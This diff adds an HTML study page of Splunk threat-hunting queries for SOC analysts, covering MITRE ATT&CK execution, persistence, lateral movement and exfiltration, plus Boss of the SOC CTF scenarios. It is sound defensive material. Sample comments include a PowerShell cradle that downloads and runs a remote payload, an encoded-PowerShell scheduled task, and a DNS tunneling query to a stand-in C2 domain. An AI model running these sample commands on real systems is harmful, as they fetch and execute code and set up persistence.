@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Threat Hunting — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()" title="Toggle sidebar" aria-label="Toggle sidebar">
+    <svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor">
+      <rect width="15" height="2" rx="1"/>
+      <rect y="5" width="15" height="2" rx="1"/>
+      <rect y="10" width="15" height="2" rx="1"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside id="sb" class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-label">Splunk</div>
+      <div class="sidebar-title">Threat Hunting</div>
+    </div>
+  </aside>
+
+  <main id="main" class="main">
+    <div class="content-wrap">
+      <div id="content-area">
+        <div class="welcome">
+          <div class="w-icon">🎯</div>
+          <h2>Threat Hunting</h2>
+          <p>Select a topic from the sidebar to begin.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Threat Hunting',
+  topics: [
+    { id: 'hunting-framework', badge: '01', label: 'Hunting Framework'              },
+    { id: 'ta0002-execution',  badge: '02', label: 'TA0002 — Execution'            },
+    { id: 'ta0003-persistence',badge: '03', label: 'TA0003 — Persistence'          },
+    { id: 'ta0008-lateral',    badge: '04', label: 'TA0008 — Lateral Movement'     },
+    { id: 'ta0010-exfil',      badge: '05', label: 'TA0010 — Exfiltration'         },
+    { id: 'bots-scenarios',    badge: '06', label: 'BOTS Scenario Queries'         },
+  ]
+};
+</script>
+
+<template id="tpl-hunting-framework">
+<article class="topic">
+<h1>01 · Threat Hunting Framework</h1>
+<hr class="divider">
+
+<h2>Hunt Types</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Type</th><th>Description</th><th>Starting Point</th></tr></thead>
+  <tbody>
+    <tr><td>Hypothesis-Based</td><td>Start with a specific threat scenario — "An attacker is using PowerShell to download payloads"</td><td>MITRE ATT&amp;CK technique</td></tr>
+    <tr><td>Intel-Driven</td><td>Hunt for specific IOCs from threat intel (IP, hash, domain)</td><td>Threat report / TIP feed</td></tr>
+    <tr><td>Anomaly-Based</td><td>Find statistical outliers — processes, users, or traffic behaving unusually</td><td>Baseline comparison</td></tr>
+    <tr><td>TTP-Based</td><td>Hunt for attacker behaviors regardless of specific IOCs</td><td>MITRE ATT&amp;CK TTPs</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Hunt Process (6 Steps)</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Step</th><th>Action</th></tr></thead>
+  <tbody>
+    <tr><td>1. Hypothesis</td><td>Define the threat: "APT group X uses T1059.001 PowerShell"</td></tr>
+    <tr><td>2. Data Source</td><td>Identify relevant log sources: Sysmon Event 1, WinEventLog 4688, PS Operational 4104</td></tr>
+    <tr><td>3. Search</td><td>Write SPL to surface evidence of the behavior</td></tr>
+    <tr><td>4. Baseline</td><td>Compare against normal — what does legitimate PowerShell look like?</td></tr>
+    <tr><td>5. Triage</td><td>Investigate anomalous hits — are they malicious or benign?</td></tr>
+    <tr><td>6. Tune / Document</td><td>Create detection if threat found; document findings; improve coverage</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>MITRE ATT&amp;CK to Splunk Data Sources</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>ATT&amp;CK Tactic</th><th>Key Splunk Sources</th><th>Critical Fields</th></tr></thead>
+  <tbody>
+    <tr><td>TA0001 Initial Access</td><td>Web proxy, email gateway, endpoint</td><td>url, subject, attachment_name, process</td></tr>
+    <tr><td>TA0002 Execution</td><td>Sysmon E1, WinEvent 4688, PS Operational 4104</td><td>process, CommandLine, ParentImage</td></tr>
+    <tr><td>TA0003 Persistence</td><td>Sysmon E12/13, WinEvent 4698, 7045, registry</td><td>registry_path, TaskName, ImagePath</td></tr>
+    <tr><td>TA0004 Privilege Escalation</td><td>WinEvent 4672, 4673, 4674</td><td>PrivilegeList, SubjectUserName</td></tr>
+    <tr><td>TA0005 Defense Evasion</td><td>Sysmon E1, WinEvent 4688, PS 4104</td><td>CommandLine, encoded commands</td></tr>
+    <tr><td>TA0006 Credential Access</td><td>WinEvent 4624/4625/4648, Sysmon E10</td><td>TargetImage, GrantedAccess, user</td></tr>
+    <tr><td>TA0007 Discovery</td><td>WinEvent 4688, Sysmon E1, network</td><td>CommandLine (net, whoami, ipconfig)</td></tr>
+    <tr><td>TA0008 Lateral Movement</td><td>WinEvent 4648, 4624 LogonType=3, Sysmon E3</td><td>src_ip, dest, LogonType, user</td></tr>
+    <tr><td>TA0010 Exfiltration</td><td>Firewall, proxy, DNS</td><td>bytes_out, dest_ip, query, duration</td></tr>
+    <tr><td>TA0011 C2</td><td>Firewall, DNS, proxy</td><td>dest_ip, query, protocol, beacon_interval</td></tr>
+  </tbody>
+</table>
+</div>
+</article>
+</template>
+
+<template id="tpl-ta0002-execution">
+<article class="topic">
+<h1>02 · TA0002 — Execution Hunting</h1>
+<hr class="divider">
+
+<h2>T1059.001 — PowerShell Execution</h2>
+<pre><code><span class="cm"># Encoded PowerShell commands (common obfuscation)</span>
+index=windows (sourcetype=WinEventLog:Security EventCode=4688
+    OR sourcetype=XmlWinEventLog:Security EventCode=4688)
+| where match(CommandLine, "(?i)-enc(?:odedcommand)?")
+| eval encoded_flag = if(match(CommandLine,"(?i)-nop|-noprofile"),"noprofile","")
+| table _time, host, user, ParentImage, CommandLine, encoded_flag
+| sort -_time
+
+<span class="cm"># PowerShell downloading from internet (cradle detection)</span>
+index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104
+| where match(ScriptBlockText, "(?i)Net\.WebClient|DownloadString|Invoke-Expression|IEX|WebRequest|downloadfile")
+| table _time, host, user, ScriptBlockText
+| sort -_time
+
+<span class="cm"># Sample suspicious ScriptBlockText:</span>
+<span class="cm"># IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.34/payload.ps1')</span></code></pre>
+
+<h2>T1059.003 — Windows Command Shell (LOLBins)</h2>
+<pre><code><span class="cm"># Unusual parent-child process relationships</span>
+index=endpoint sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
+| where match(Image, "(?i)cmd\.exe|powershell\.exe|wscript\.exe|cscript\.exe|mshta\.exe")
+| where match(ParentImage, "(?i)winword\.exe|excel\.exe|outlook\.exe|chrome\.exe|firefox\.exe|iexplore\.exe")
+| table _time, host, user, ParentImage, Image, CommandLine
+| sort -_time
+
+<span class="cm"># Sample output (macro execution from Office):</span>
+<span class="cm"># ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE</span>
+<span class="cm"># Image: C:\Windows\System32\cmd.exe</span>
+<span class="cm"># CommandLine: cmd.exe /c powershell -nop -enc JABjAGwAaQBlAG4AdA...</span></code></pre>
+
+<h2>Living Off the Land — Binary Detection</h2>
+<pre><code"><span class="cm"># Detect common LOLBin abuse</span>
+index=endpoint EventCode=1 earliest=-24h
+| eval is_lolbin = case(
+    match(Image,"(?i)regsvr32\.exe") AND match(CommandLine,"(?i)/s.*scrobj|\/i:http"), "regsvr32 scriptlet",
+    match(Image,"(?i)certutil\.exe") AND match(CommandLine,"(?i)-decode|-urlcache"), "certutil download",
+    match(Image,"(?i)mshta\.exe") AND match(CommandLine,"(?i)http|vbs|javascript"), "mshta script",
+    match(Image,"(?i)rundll32\.exe") AND match(CommandLine,"(?i)javascript:|shell32"), "rundll32 shell",
+    match(Image,"(?i)wmic\.exe") AND match(CommandLine,"(?i)process call create"), "wmic exec",
+    true, null()
+  )
+| where isnotnull(is_lolbin)
+| table _time, host, user, is_lolbin, CommandLine</code></pre>
+</article>
+</template>
+
+<template id="tpl-ta0003-persistence">
+<article class="topic">
+<h1>03 · TA0003 — Persistence Hunting</h1>
+<hr class="divider">
+
+<h2>T1053.005 — Scheduled Task Creation</h2>
+<pre><code><span class="cm"># Windows scheduled task creation (EventCode 4698)</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4698 earliest=-24h
+| table _time, host, SubjectUserName, TaskName, TaskContent
+| sort -_time
+
+<span class="cm"># Suspicious scheduled tasks via schtasks.exe command line</span>
+index=endpoint EventCode=1
+| where match(Image, "(?i)schtasks\.exe")
+    AND match(CommandLine, "(?i)/create")
+| table _time, host, user, CommandLine
+| sort -_time
+
+<span class="cm"># Sample malicious scheduled task:</span>
+<span class="cm"># schtasks /create /sc daily /tn "WindowsUpdate" /tr "powershell -nop -enc JABjAGwA..."</span></code></pre>
+
+<h2>T1543.003 — New Windows Service</h2>
+<pre><code"><span class="cm"># New service installed (EventCode 7045)</span>
+index=windows sourcetype=WinEventLog:System EventCode=7045 earliest=-24h
+| table _time, host, ServiceName, ImagePath, ServiceType, StartType
+| sort -_time
+
+<span class="cm"># Red flags in service creation:</span>
+<span class="cm"># - ImagePath points to temp/appdata/downloads</span>
+<span class="cm"># - ServiceName is random characters</span>
+<span class="cm"># - ServiceType = 16 (Win32OwnProcess) with unusual ImagePath</span>
+
+<span class="cm"># Sample suspicious service:</span>
+<span class="cm"># ServiceName: svc8f3a1</span>
+<span class="cm"># ImagePath: C:\Users\jsmith\AppData\Local\Temp\svc8f3a1.exe</span></code></pre>
+
+<h2>T1547.001 — Registry Run Key Persistence</h2>
+<pre><code><span class="cm"># Sysmon registry events — EventCode 12 (create/delete) and 13 (value set)</span>
+index=endpoint sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational
+    (EventCode=12 OR EventCode=13) earliest=-24h
+| where match(TargetObject,
+    "(?i)\\CurrentVersion\\Run|\\CurrentVersion\\RunOnce|\\Winlogon|\\Explorer\\Shell Folders")
+| table _time, host, user, EventCode, TargetObject, Details, Image
+| sort -_time
+
+<span class="cm"># Sample suspicious registry persistence:</span>
+<span class="cm"># TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefender</span>
+<span class="cm"># Details: C:\Users\jsmith\AppData\Roaming\update.exe</span>
+<span class="cm"># Image: C:\Windows\System32\reg.exe</span></code></pre>
+
+<h2>T1098 — Account Manipulation (New Local Admin)</h2>
+<pre><code><span class="cm"># New local admin account created (EventCode 4720 + 4732)</span>
+index=windows EventCode=4720 earliest=-24h
+| join SubjectUserName [search index=windows EventCode=4732 GroupName=Administrators]
+| table _time, host, SubjectUserName, TargetUserName, GroupName</code></pre>
+</article>
+</template>
+
+<template id="tpl-ta0008-lateral">
+<article class="topic">
+<h1>04 · TA0008 — Lateral Movement Hunting</h1>
+<hr class="divider">
+
+<h2>T1021.001 — RDP Lateral Movement</h2>
+<pre><code><span class="cm"># RDP logins — LogonType 10 (RemoteInteractive)</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4624 LogonType=10 earliest=-24h
+| table _time, host, user, src_ip, IpPort
+| sort -_time
+
+<span class="cm"># New source IP RDP-ing to server for first time (baselining)</span>
+index=windows EventCode=4624 LogonType=10 earliest=-30d latest=-24h
+| stats values(src_ip) AS known_ips by dest, user
+| outputlookup rdp_baseline.csv
+
+index=windows EventCode=4624 LogonType=10 earliest=-24h
+| lookup rdp_baseline.csv dest, user OUTPUT known_ips
+| where NOT match(src_ip, known_ips)
+| table _time, host, user, src_ip</code></pre>
+
+<h2>T1021.002 — SMB / Network Logon (Pass-the-Hash / PsExec)</h2>
+<pre><code><span class="cm"># SMB network logons — LogonType 3 + NTLM auth = potential PtH</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4624
+    LogonType=3 AuthenticationPackageName=NTLM earliest=-24h
+| where NOT match(user, "(?i)ANONYMOUS LOGON|SYSTEM|\$$")
+| stats count AS ntlm_logins, dc(host) AS unique_targets, values(host) AS targets
+    by src_ip, user
+| where ntlm_logins &gt; 5
+| sort -unique_targets
+
+<span class="cm"># PsExec detection via service creation on remote host</span>
+index=windows EventCode=7045 earliest=-24h
+| where match(ServiceName, "(?i)PSEXESVC|psexec") OR
+        match(ImagePath, "(?i)\\ADMIN\$\\PSEXESVC|admin\$\\system32")
+| table _time, host, ServiceName, ImagePath</code></pre>
+
+<h2>T1021.006 — WMI Remote Execution</h2>
+<pre><code><span class="cm"># WMI process creation on remote host</span>
+<span class="cm"># Parent: WmiPrvSE.exe spawning unusual child process</span>
+index=endpoint EventCode=1
+| where match(ParentImage, "(?i)WmiPrvSE\.exe")
+    AND NOT match(Image, "(?i)\\Windows\\System32\\(msiexec|wermgr|svchost)")
+| table _time, host, user, ParentImage, Image, CommandLine
+| sort -_time
+
+<span class="cm"># Network logon followed by WMI child process (correlating)</span>
+index=windows EventCode=4624 LogonType=3 earliest=-4h
+| table _time, host, user, src_ip</code></pre>
+
+<h2>T1550.002 — Pass-the-Hash Detection</h2>
+<pre><code><span class="cm"># Classic PtH indicators:</span>
+<span class="cm"># 1. EventCode=4624 with LogonType=9 (NewCredentials)</span>
+<span class="cm"># 2. High volume of NTLM auths from a single host to many targets</span>
+<span class="cm"># 3. EventCode=4776 (credential validation) with error 0xC0000064 or 0xC000006D</span>
+
+index=windows EventCode=4776 earliest=-1h
+| stats count by Workstation, TargetUserName, Status
+| where Status!="0x0" AND count &gt; 20
+| sort -count
+
+<span class="cm"># Status codes:</span>
+<span class="cm"># 0xC0000064 = user does not exist</span>
+<span class="cm"># 0xC000006D = wrong password</span>
+<span class="cm"># 0xC000006A = wrong password (specific)</span>
+<span class="cm"># 0x0        = success</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-ta0010-exfil">
+<article class="topic">
+<h1>05 · TA0010 — Exfiltration Hunting</h1>
+<hr class="divider">
+
+<h2>T1048.003 — Exfiltration Over DNS (DNS Tunneling)</h2>
+<pre><code><span class="cm"># Long DNS query names — data encoded in subdomain</span>
+index=dns earliest=-24h
+| eval query_len = len(query)
+| where query_len &gt; 50
+| stats count AS long_queries,
+        avg(query_len) AS avg_len,
+        dc(query) AS unique_queries,
+        values(query) AS sample_queries
+        by src_ip
+| where long_queries &gt; 10
+| sort -long_queries
+
+<span class="cm"># Sample DNS tunneling query:</span>
+<span class="cm"># aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=.c2.evil.com</span>
+<span class="cm"># (Base64 encoded data in subdomain)</span>
+
+<span class="cm"># High DNS query volume to single domain (tunneling indicator)</span>
+index=dns earliest=-24h
+| rex field=query "(?:[^.]+\.)*(?P&lt;apex_domain&gt;[^.]+\.[^.]+)$"
+| stats count AS queries, dc(query) AS unique_subdomains by src_ip, apex_domain
+| where unique_subdomains &gt; 100 OR queries &gt; 500
+| sort -unique_subdomains</code></pre>
+
+<h2>T1048.002 — Exfil Over HTTPS (Large Uploads)</h2>
+<pre><code><span class="cm"># Large outbound data transfers — potential exfiltration</span>
+index=network sourcetype=pan:traffic action=allow dest_port=443 earliest=-24h
+| stats sum(bytes_out) AS total_out by src_ip, dest_ip
+| eval MB_out = round(total_out / 1024 / 1024, 2)
+| where MB_out &gt; 100
+| sort -MB_out
+
+<span class="cm"># After-hours large uploads (midnight exfil pattern)</span>
+index=network sourcetype=pan:traffic earliest=-24h
+| eval hour = tonumber(strftime(_time, "%H"))
+| where (hour &lt; 7 OR hour &gt; 20)
+| stats sum(bytes_out) AS nighttime_bytes by src_ip, dest_ip
+| eval MB_out = round(nighttime_bytes/1024/1024, 2)
+| where MB_out &gt; 50
+| sort -MB_out</code></pre>
+
+<h2>T1041 — Exfil Over C2 Channel (Beaconing Detection)</h2>
+<pre><code><span class="cm"># C2 beaconing: regular interval connections to same external IP</span>
+index=network sourcetype=pan:traffic action=allow earliest=-24h
+| where NOT match(dest_ip, "^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)")
+| bucket _time span=1h
+| stats count AS hourly_conns by src_ip, dest_ip, _time
+| stats stdev(hourly_conns) AS conn_stdev, avg(hourly_conns) AS conn_avg,
+        count AS hours_seen by src_ip, dest_ip
+| where hours_seen &gt; 20 AND conn_stdev &lt; 2
+<span class="cm"># Low stdev = very regular = beaconing pattern</span>
+| sort conn_stdev</code></pre>
+</article>
+</template>
+
+<template id="tpl-bots-scenarios">
+<article class="topic">
+<h1>06 · BOTS Scenario Queries</h1>
+<hr class="divider">
+
+<div class="callout lab"><strong>Boss of the SOC (BOTS)</strong> — Splunk's CTF-style dataset. These queries reflect the types of searches used to answer BOTS v1/v2/v3 questions. Sourcetypes and field names are from the actual BOTS dataset.</div>
+
+<h2>BOTS Common Sourcetypes</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Sourcetype</th><th>Data</th></tr></thead>
+  <tbody>
+    <tr><td><code>stream:http</code></td><td>HTTP request/response via Splunk Stream</td></tr>
+    <tr><td><code>suricata</code></td><td>Suricata IDS JSON alerts</td></tr>
+    <tr><td><code>WinEventLog:Security</code></td><td>Windows security events</td></tr>
+    <tr><td><code>XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</code></td><td>Sysmon XML events</td></tr>
+    <tr><td><code>fgt_traffic</code></td><td>Fortinet firewall traffic</td></tr>
+    <tr><td><code>fgt_utm</code></td><td>Fortinet UTM (IPS, web filter)</td></tr>
+    <tr><td><code>nessus:scan</code></td><td>Nessus vulnerability scan results</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Scenario 1: Web Scanning / Reconnaissance</h2>
+<pre><code><span class="cm"># Find the IP scanning the web server</span>
+index=botsv1 sourcetype=stream:http earliest=0
+| stats count by src_ip
+| sort -count
+| head 10
+
+<span class="cm"># What URLs was the scanner hitting?</span>
+index=botsv1 sourcetype=stream:http src_ip=40.80.148.42 earliest=0
+| stats count by uri_path
+| sort -count | head 20
+
+<span class="cm"># Suricata alerts for the scanner</span>
+index=botsv1 sourcetype=suricata src_ip=40.80.148.42 earliest=0
+| stats count by alert.signature
+| sort -count</code></pre>
+
+<h2>Scenario 2: Web Shell Upload &amp; C2</h2>
+<pre><code><span class="cm"># Find file upload to web server</span>
+index=botsv1 sourcetype=stream:http http_method=POST earliest=0
+| where match(uri_path, "(?i)\.php$|upload|shell")
+| table _time, src_ip, dest_ip, uri_path, http_user_agent, status
+
+<span class="cm"># Identify web shell execution (POST to script file)</span>
+index=botsv1 sourcetype=stream:http http_method=POST earliest=0
+| where match(uri_path, "(?i)\.php") AND bytes_out &gt; 100
+| stats count, values(form_data) AS commands by uri_path, src_ip</code></pre>
+
+<h2>Scenario 3: Credential Brute Force</h2>
+<pre><code><span class="cm"># Failed logins by source — identify attacker IP</span>
+index=botsv1 sourcetype=WinEventLog:Security EventCode=4625 earliest=0
+| stats count by src_ip, user
+| sort -count | head 20
+
+<span class="cm"># Successful login after brute force — confirm compromise</span>
+index=botsv1 sourcetype=WinEventLog:Security EventCode=4624 earliest=0
+| where src_ip="23.22.63.114"
+| table _time, host, user, LogonType, src_ip</code></pre>
+
+<h2>Scenario 4: Post-Compromise Activity</h2>
+<pre><code><span class="cm"># Process execution after compromise (Sysmon EventCode=1)</span>
+index=botsv1 sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+    EventCode=1 host=WORKSTATION-01 earliest=0
+| table _time, user, Image, CommandLine, ParentImage
+| sort _time
+| head 50
+
+<span class="cm"># Network connections from compromised host (Sysmon EventCode=3)</span>
+index=botsv1 sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+    EventCode=3 host=WORKSTATION-01 earliest=0
+| where NOT match(DestinationIp, "^(10\.|192\.168\.|172\.|127\.)")
+| table _time, Image, DestinationIp, DestinationPort, Protocol
+| sort _time</code></pre>
+</article>
+</template>
+
+<script src="js/app.js"></script>
+</body>
+</html>
